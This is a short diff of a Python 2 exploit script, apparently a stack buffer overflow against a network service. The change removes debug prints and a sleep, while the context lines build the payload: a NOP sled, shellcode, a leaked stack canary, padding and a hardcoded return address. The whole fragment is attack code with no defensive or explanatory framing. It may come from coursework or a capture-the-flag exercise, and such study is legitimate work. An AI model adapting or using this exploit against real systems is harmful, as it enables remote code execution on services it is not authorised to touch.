@@ -61,12 +61,6 @@ def exploit(host, port, shellcode):
     for i in range(0, len(canary)):
         print ord(canary[i])
 
-    print ':'.join(x.encode('hex') for x in canary)
-
-    time.sleep(5)
-
-    print len(shellcode)
-
     # construct query to unlink
     # \x90 = NOP
     buf_str = "\x90" * (2048 - len(shellcode)) + shellcode + canary + "A" * 12 + "\x00\xf0\xff\xbf"
